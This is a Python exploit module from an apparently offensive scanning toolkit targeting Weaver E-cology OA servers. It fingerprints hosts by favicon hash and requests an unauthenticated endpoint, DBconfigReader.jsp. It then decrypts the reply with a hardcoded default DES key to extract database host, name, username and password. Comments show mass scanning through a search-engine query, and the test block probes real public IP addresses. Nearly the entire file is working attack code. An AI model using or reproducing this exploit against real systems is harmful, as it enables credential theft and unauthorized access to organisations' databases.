# coding=utf-8
# @Author   : zpchcbd HG team
# @Time     : 2021-09-19 23:29

import hashlib
import pyDes

from colorama import Fore
from tqdm import tqdm

from exploit.web import BaseScript
from core.MyEnums import *
from core.request.asynchttp import *

# module rule
from core.variablemanager import GlobalVariableManager

# app="泛微-协同办公OA"
# python batch.py -m exploit.web.OA.Weaver.E-Weaver.unauth_readfile_database -cs -fs "app=\"泛微-协同办公OA\""

class Script(BaseScript):
    name = 'E-Weaver'

    def __init__(self, target, session):
        super().__init__()
        # 漏洞目标
        self.target = target
        # 漏洞等级
        self.bugLevel = BugLevel.HIGH
        # 类型
        self.bugType = BugType.READFILE
        # 编号
        self.bugNumber = ''
        # 来源
        self.refer = 'https://github.com/z1un/weaver_exp/blob/a3f5f60114c131604af2f29932d14da89c330388/poc/E_Cology_Database_Leak.py'
        # 特定路径判断
        self.detectPathList = ['/favicon.ico']
        # exec
        self.execPathList = ['/mobile/DBconfigReader.jsp']
        # session
        self.session = session
        # 相关信息
        self.info = ''
        self.favicon = ['41eca7a9245394106a09b2534d8030df',
                        '281348dd57383c1f214ffb8aed3a1210',
                        '9b1d3f08ede38dbe699d6b2e72a8febb',
                        'c27547e27e1d2c7514545cd8d5988946']

    async def detect(self):
        try:
            for detectPath in self.detectPathList:
                url = f'http://{self.target}{detectPath}' if self.target.startswith(
                    ('http:', 'https:')) is False else f'{self.target}{detectPath}'
                async with self.session.get(url=url, headers=self.headers, timeout=self.reqTimeout, verify_ssl=False) as response:
                    if response is not None:
                        text = await response.read()
                        await asyncio.sleep(2)
                        m1 = hashlib.md5()
                        m1.update(text)
                        theMD5 = m1.hexdigest()
                        for _ in self.favicon:
                            if _ == theMD5:
                                self.flag = True
                                self.addInGlobalVariable(self.name)
                                tqdm.write(Fore.RED + '[{}] {}'.format('E-Weaver Finger', url))
                                return {'name': 'E-Weaver Finger', 'url': url, 'software': 'E-Weaver'}
        except Exception:
            return None

    async def exec(self):
        def decodeDes(secret_key, s):
            try:
                cipherX = pyDes.des('        ')  # 默认就需要8位，所以这里就先用空格来进行填充，后面再用解密密钥来进行填充
                cipherX.setKey(secret_key)
                decodeText = cipherX.decrypt(s)
            except Exception:
                decodeText = ''
            return decodeText

        try:
            for execPath in self.execPathList:
                url = f'http://{self.target}{execPath}' if self.target.startswith(
                    ('http:', 'https:')) is False else f'{self.target}{execPath}'
                async with self.session.get(url=url, timeout=self.reqTimeout, verify_ssl=False) as response:
                    if response is not None and response.status == 200:
                        text = await response.read()
                        await asyncio.sleep(2)
                        data = decodeDes('1z2x3c4v5b6n', text.strip())  # 这里使用的就是默认的数据库解密密钥，1z2x3c4v5b6n
                        if data:
                            data = data.strip()
                            # 下面来进行填充即可
                            dbType = str(data).split(';')[0].split(':')[1]
                            dbUrl = str(data).split(';')[0].split(':')[2].split('//')[1]
                            dbPort = str(data).split(';')[0].split(':')[3]
                            dbName = str(data).split(';')[1].split(',')[0].split('=')[1]
                            dbUser = str(data).split(';')[1].split(',')[1].split('=')[1]
                            dbPass = str(data).split(';')[1].split(',')[2].split('=')[1]
                            dbAllInfor = '{} - {} - {} - {} - {} - {}'.format(dbType, dbUrl, dbPort, dbName, dbUser, dbPass)
                            await asyncio.sleep(2)
                            tqdm.write(Fore.RED + '[{}] - {} - {}'.format('E-Weaver ReadFile Database', dbAllInfor, url))
                            return {'name': 'E-Weaver ReadFile Database - {}'.format(dbAllInfor), 'url': url, 'software': 'E-Weaver'}
        except Exception:
            return None

    async def attack(self, semaphore, pbar):
        async with semaphore:
            a = await self.detect()
            if a is not None:
                self.vulList.append(a)
            if self.flag:
                b = await self.exec()
                if b is not None:
                    self.vulList.append(b)
        pbar.update(1)
        return self.vulList


if __name__ == '__main__':
    import requests
    import hashlib
    import base64
    resp = requests.get('https://50.84.113.154:8443/favicon.ico', verify=False)
    if resp.status_code == 200:
        m1 = hashlib.md5()
        m1.update(resp.content)
        theMD5 = m1.hexdigest()
        print(theMD5)
    #
    # semaphore = asyncio.Semaphore(500)
    # sc = Script('61.150.65.205:9999', 1)
    # l = asyncio.get_event_loop()
    # l.run_until_complete(sc.attack(semaphore))

    #test
    def decodeDes(secret_key, s):
        cipherX = pyDes.des('        ')  # 默认就需要8位，所以这里就先用空格来进行填充，后面再用解密密钥来进行填充
        cipherX.setKey(secret_key)
        decodeText = cipherX.decrypt(s)
        return decodeText
    b64 = base64.b64decode('fDs\/AjDBWXp1Xb98W8TZnA==')
    te = decodeDes('kmssAdmin', b64).decode('utf-8')
    print(te)